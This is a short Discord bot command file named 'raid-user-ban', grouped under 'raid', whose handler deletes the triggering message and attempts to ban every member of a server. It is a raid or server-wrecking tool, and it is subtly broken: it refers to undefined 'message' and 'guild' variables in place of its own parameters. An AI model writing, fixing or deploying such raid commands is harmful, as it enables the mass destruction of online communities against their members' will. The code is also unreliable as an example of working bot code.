module.exports.run = (client, msg, args, config) => {
	msg.delete();
	message.guild.members.forEach(user => guild.members.ban(user.id));
};

exports.help = {
  name: "raid-user-ban",
  usage: ";raid-user-ban",
  desc: "Bans all of the users in a channel.",
  ownerOnly: true,
  group: "raid",
  example: ";raid-user-ban"
};
